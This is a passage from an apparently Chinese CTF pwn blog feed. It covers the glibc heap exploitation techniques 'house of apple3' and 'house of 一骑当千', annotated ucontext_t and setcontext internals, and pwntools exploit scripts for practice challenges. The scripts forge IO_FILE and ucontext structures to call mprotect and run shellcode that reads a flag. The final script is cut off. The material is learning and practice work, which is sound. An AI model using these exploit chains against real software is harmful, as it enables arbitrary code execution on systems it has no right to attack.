class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>p.recv(<span class="hljs-number">2</span>)<br><br>heapbase = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0xcb0</span><br>lg(<span class="hljs-string">&#x27;heapbase&#x27;</span>, heapbase)<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>_IO_list_all = libc_base + <span class="hljs-number">0x21a680</span><br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x21ba80</span><br>_IO_wide_jumps = libc_base + <span class="hljs-number">0x2160c0</span><br>_IO_obstack_jumps = libc_base + <span class="hljs-number">0x2163c0</span><br>_IO_wide_data = libc_base + <span class="hljs-number">0x219b80</span><br><br>gadgets = [<span class="hljs-number">0x50a37</span>, <span class="hljs-number">0xebcf1</span>, <span class="hljs-number">0xebcf5</span>, <span class="hljs-number">0xebcf8</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">0</span>]<br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x500</span>)<br><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x1000</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">6</span>)<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x540</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x540</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x560</span>)<br><br>delete(<span class="hljs-number">10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x1000</span>)<br><br>payload = flat(&#123;<br>    <span class="hljs-number">0</span>: house_of_obstack(heapbase + <span class="hljs-number">0x16f0</span>), <br>    <span class="hljs-number">0x540</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0x551</span>],<br>    <span class="hljs-number">0xa90</span>: [<br>        <span class="hljs-number">0</span>, <span class="hljs-number">0x571</span>,<br>        libc_base + <span class="hljs-number">0x21a120</span>, libc_base + <span class="hljs-number">0x21a120</span>, <br>        heapbase + <span class="hljs-number">0x2190</span>, _IO_list_all - <span class="hljs-number">0x20</span><br>    ]<br>&#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><br>edit(<span class="hljs-number">6</span>, <span class="hljs-built_in">len</span>(payload), payload)<br><br>delete(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x1000</span>)<br><br><span class="hljs-comment"># dbg()</span><br><br>menu(<span class="hljs-number">5</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-%E6%98%A5%E7%A7%8B%E6%9D%AFpwn-wp/image-20230711210754278.png" alt="image-20230711210754278"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of apple + house of 一骑绝尘</title>
    <link href="/2023/02/16/house-of-apple-house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/"/>
    <url>/2023/02/16/house-of-apple-house-of-%E4%B8%80%E9%AA%91%E7%BB%9D%E5%B0%98/</url>
    
    <content type="html"><![CDATA[<h1 id="house-of-apple3-house-of-一骑当千"><a href="#house-of-apple3-house-of-一骑当千" class="headerlink" title="house of apple3 + house of 一骑当千"></a>house of apple3 + house of 一骑当千</h1><blockquote><p>libc2.36之后，去除了我们常用的magic gadget，以至于我们无法通过house of apple控制rdx，从而实现ORW。但是house of 一骑绝尘为我们提供了一个新的思路 。伪造ucontext_t结构体，通过执行setcontext控制rdx。</p></blockquote><h2 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a>house of apple3</h2><p>基于<strong>IO_FILE-&gt;_codecvt</strong>的利用方法。详细请参考<a href="https://bbs.kanxue.com/user-home-956675.htm">roderick01</a>师傅的博客。</p><h2 id="house-of-一骑当千"><a href="#house-of-一骑当千" class="headerlink" title="house of 一骑当千"></a>house of 一骑当千</h2><h3 id="key-struct"><a href="#key-struct" class="headerlink" title="key struct"></a>key struct</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Container for all general registers.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">greg_t</span> <span class="hljs-type">gregset_t</span>[__NGREG];<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __USE_GNU</span><br><span class="hljs-comment">/* Number of each register in the `gregset_t&#x27; array.  */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span></span><br><span class="hljs-class">&#123;</span><br>  REG_R8 = <span class="hljs-number">0</span>,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R8REG_R8</span><br>  REG_R9,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R9REG_R9</span><br>  REG_R10,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R10REG_R10</span><br>  REG_R11,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R11REG_R11</span><br>  REG_R12,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R12REG_R12</span><br>  REG_R13,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R13REG_R13</span><br>  REG_R14,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R14REG_R14</span><br>  REG_R15,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_R15REG_R15</span><br>  REG_RDI,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RDIREG_RDI</span><br>  REG_RSI,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RSIREG_RSI</span><br>  REG_RBP,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RBPREG_RBP</span><br>  REG_RBX,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RBXREG_RBX</span><br>  REG_RDX,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RDXREG_RDX</span><br>  REG_RAX,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RAXREG_RAX</span><br>  REG_RCX,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RCXREG_RCX</span><br>  REG_RSP,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RSPREG_RSP</span><br>  REG_RIP,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_RIPREG_RIP</span><br>  REG_EFL,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_EFLREG_EFL</span><br>  REG_CSGSFS,<span class="hljs-comment">/* Actually short cs, gs, fs, __pad0.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_CSGSFSREG_CSGSFS</span><br>  REG_ERR,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_ERRREG_ERR</span><br>  REG_TRAPNO,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_TRAPNOREG_TRAPNO</span><br>  REG_OLDMASK,<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_OLDMASKREG_OLDMASK</span><br>  REG_CR2<br><span class="hljs-meta"># <span class="hljs-keyword">define</span> REG_CR2REG_CR2</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_fpxreg</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> __ctx(significand)[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> __ctx(exponent);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> __glibc_reserved1[<span class="hljs-number">3</span>];<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_xmmreg</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">__uint32_t</span>__ctx(element)[<span class="hljs-number">4</span>];<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* 64-bit FXSAVE format.  */</span><br>  <span class="hljs-type">__uint16_t</span>__ctx(cwd);<br>  <span class="hljs-type">__uint16_t</span>__ctx(swd);<br>  <span class="hljs-type">__uint16_t</span>__ctx(ftw);<br>  <span class="hljs-type">__uint16_t</span>__ctx(fop);<br>  <span class="hljs-type">__uint64_t</span>__ctx(rip);<br>  <span class="hljs-type">__uint64_t</span>__ctx(rdp);<br>  <span class="hljs-type">__uint32_t</span>__ctx(mxcsr);<span class="hljs-comment">// 0x1c0</span><br>  <span class="hljs-type">__uint32_t</span>__ctx(mxcr_mask);<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_fpxreg</span>_<span class="hljs-title">st</span>[8];</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_xmmreg</span>_<span class="hljs-title">xmm</span>[16];</span><br>  <span class="hljs-type">__uint32_t</span>__glibc_reserved1[<span class="hljs-number">24</span>];<br>&#125;;<br><span class="hljs-comment">/* Structure to describe FPU registers.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_fpstate</span> *<span class="hljs-title">fpregset_t</span>;</span><br><br><span class="hljs-comment">/* Context to describe whole processor state.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-type">gregset_t</span> __ctx(gregs);<span class="hljs-comment">// size = 0xb8</span><br>    <span class="hljs-comment">/* Note that fpregs is a pointer.  */</span><br>    <span class="hljs-type">fpregset_t</span> __ctx(fpregs);<span class="hljs-comment">// 0x8</span><br>    __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> __reserved1 [<span class="hljs-number">8</span>];<span class="hljs-comment">// 0x40</span><br>&#125; <span class="hljs-type">mcontext_t</span>;<span class="hljs-comment">// size = 0x100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stack_t</span> &#123;</span><br>    <span class="hljs-type">void</span> *ss_sp;<br>    <span class="hljs-type">int</span> ss_flags;<br>    <span class="hljs-type">size_t</span> ss_size;<br>&#125;<br><br><span class="hljs-comment">/* Userlevel context.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext_t</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> __ctx(uc_flags);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext_t</span> *<span class="hljs-title">uc_link</span>;</span><br>    <span class="hljs-type">stack_t</span> uc_stack;<span class="hljs-comment">// size = 0x18</span><br>    <span class="hljs-type">mcontext_t</span> uc_mcontext;<span class="hljs-comment">// size = 0x100, offset = 0x28</span><br>    <span class="hljs-type">sigset_t</span> uc_sigmask;<span class="hljs-comment">// size = 0x80, offset = 0x128</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">libc_fpstate</span> __<span class="hljs-title">fpregs_mem</span>;</span><span class="hljs-comment">// size = 0x200, offset = 0x1a8</span><br>    __extension__ <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> __ssp[<span class="hljs-number">4</span>];<br>  &#125; <span class="hljs-type">ucontext_t</span>;<span class="hljs-comment">// size = 0x3c8</span><br><br></code></pre></td></tr></table></figure><h3 id="setcontext-x86"><a href="#setcontext-x86" class="headerlink" title="setcontext(x86)"></a><strong>setcontext(x86)</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;+0&gt;:endbr64 <br>&lt;+4&gt;:push   rdi<br>&lt;+5&gt;:lea    rsi,[rdi+0x128]<br>&lt;+12&gt;:xor    edx,edx<br>&lt;+14&gt;:mov    edi,0x2<br>&lt;+19&gt;:mov    r10d,0x8<br>&lt;+25&gt;:mov    eax,0xe<br>&lt;+30&gt;:syscall <br>&lt;+32&gt;:pop    rdx# key<br>&lt;+33&gt;:cmp    rax,0xfffffffffffff001<br>&lt;+39&gt;:jae    &lt;setcontext+335&gt;<br>&lt;+45&gt;:mov    rcx,QWORD PTR [rdx+0xe0]<br>&lt;+52&gt;:fldenv [rcx]# 加载浮点环境，可写<br>&lt;+54&gt;:ldmxcsr DWORD PTR [rdx+0x1c0]# 加载mxcsr寄存器，全为0即可<br>&lt;+61&gt;:mov    rsp,QWORD PTR [rdx+0xa0]<br>&lt;+68&gt;:mov    rbx,QWORD PTR [rdx+0x80]<br>&lt;+75&gt;:mov    rbp,QWORD PTR [rdx+0x78]<br>&lt;+79&gt;:mov    r12,QWORD PTR [rdx+0x48]<br>&lt;+83&gt;:mov    r13,QWORD PTR [rdx+0x50]<br>&lt;+87&gt;:mov    r14,QWORD PTR [rdx+0x58]<br>&lt;+91&gt;:mov    r15,QWORD PTR [rdx+0x60]<br>&lt;+95&gt;:test   DWORD PTR fs:0x48,0x2<br>&lt;+107&gt;:je     &lt;setcontext+294&gt;<br># ......<br>&lt;+294&gt;:mov    rcx,QWORD PTR [rdx+0xa8]<br>&lt;+301&gt;:push   rcx<br>&lt;+302&gt;:mov    rsi,QWORD PTR [rdx+0x70]<br>&lt;+306&gt;:mov    rdi,QWORD PTR [rdx+0x68]<br>&lt;+310&gt;:mov    rcx,QWORD PTR [rdx+0x98]<br>&lt;+317&gt;:mov    r8,QWORD PTR [rdx+0x28]<br>&lt;+321&gt;:mov    r9,QWORD PTR [rdx+0x30]<br>&lt;+325&gt;:mov    rdx,QWORD PTR [rdx+0x88]<br>&lt;+332&gt;:xor    eax,eax<br>&lt;+334&gt;:ret    <br>&lt;+335&gt;:mov    rcx,QWORD PTR [rip+0x1c528a]<br>&lt;+342&gt;:neg    eax<br>&lt;+344&gt;:mov    DWORD PTR fs:[rcx],eax<br>&lt;+347&gt;:or     rax,0xffffffffffffffff<br>&lt;+351&gt;:ret <br></code></pre></td></tr></table></figure><p>阅读<code>setcontext</code>源代码可知，我们之前利用是从<code>setcontext + 61</code>开始，所以我们需要想办法控制<strong>rdx</strong>。但是我们可以看到，该函数一开始就将<strong>rdi</strong>压栈，并且出栈给<strong>rdx</strong>，所以我们只要控制<strong>rdi</strong>，即<code>setcontext</code>第一个参数，并且绕过一些判断，就可以实现rdi控制rdx，进行ORW的目的。</p><h2 id="模板（orw）"><a href="#模板（orw）" class="headerlink" title="模板（orw）"></a>模板（orw）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO_file_addr = heap + <span class="hljs-number">0xcf0</span><br>fake_ucontext_addr = fake_IO_file_addr + <span class="hljs-number">0x100</span> <br><br><span class="hljs-comment"># house of apple3</span><br>fake_IO_file = p64(<span class="hljs-number">0xffffffffffffffff</span>)<span class="hljs-comment">#_IO_read_endtable</span><br>fake_IO_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>) <br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr + <span class="hljs-number">0x100</span>)<span class="hljs-comment"># _IO_buf_end = fake_addr</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(fake_IO_file_addr + <span class="hljs-number">0x40</span>)<span class="hljs-comment">#  _codecvt</span><br>fake_IO_file += p64(_IO_wide_data_1)<span class="hljs-comment"># 尽量保持不变</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(_IO_wfile_jumps + <span class="hljs-number">0x8</span>)<span class="hljs-comment"># vtable</span><br>fake_IO_file = fake_IO_file.ljust(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_file += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># fake_ucontext_addr</span><br>fake_IO_file += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span><br>fake_IO_file += p64(setcontext)<br><br><span class="hljs-comment"># house of 一骑当千</span><br>rdi  = fake_ucontext_addr &amp; ~<span class="hljs-number">0xfff</span>  <span class="hljs-comment"># heap_addr binsh_addr</span><br>rsi  = <span class="hljs-number">0x1000</span>      <br>rbp  = fake_ucontext_addr  + <span class="hljs-number">0x100</span><br>rbx  = <span class="hljs-number">0</span><br>rdx  = <span class="hljs-number">7</span><br>rcx  = <span class="hljs-number">0</span><br>rax  = <span class="hljs-number">0</span><br>rsp  = fake_ucontext_addr + <span class="hljs-number">0x100</span><br>rip  = mprotect<br><br>ucontext = <span class="hljs-string">b&#x27;&#x27;</span><br>ucontext += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br>ucontext += p64(rdi) + p64(rsi)<br>ucontext += p64(rbp) + p64(rbx)<br>ucontext += p64(rdx) + p64(rcx)<br>ucontext += p64(rax)<br>ucontext += p64(rsp) + p64(rip)<br>ucontext = ucontext.ljust((<span class="hljs-number">0xe0</span> - <span class="hljs-number">0x30</span>), <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>ucontext += p64(heap + <span class="hljs-number">0x1000</span>)<br>ucontext = ucontext.ljust((<span class="hljs-number">0x100</span> - <span class="hljs-number">0x30</span>), <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>shellcode = p64(fake_ucontext_addr + <span class="hljs-number">0x110</span>) + p64(<span class="hljs-number">0</span>) + asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br>payload = fake_IO_file + ucontext + <span class="hljs-built_in">bytes</span>(shellcode)<br></code></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>这里以2023 hgame week4 pwn without-hook为例，具体分析可以看<a href="https://lst-oss.github.io/2023/02/06/2022-hgame-week4/">2022-hgame-week4</a>，那一篇是使用house of cat打的。这里我们使用新方法。</p><p>详细wp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/haha2022/tools/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6&#x27;)</span><br>libc = elf.libc<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30776</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock, _IO_wide_data_1 = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_wfile_jumps_mmap = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect<br>    <span class="hljs-keyword">global</span>  _IO_list_all, _IO_stdfile_2_lock, _IO_wide_data_1<br>    <span class="hljs-keyword">global</span> _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps, _IO_wfile_jumps_mmap<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    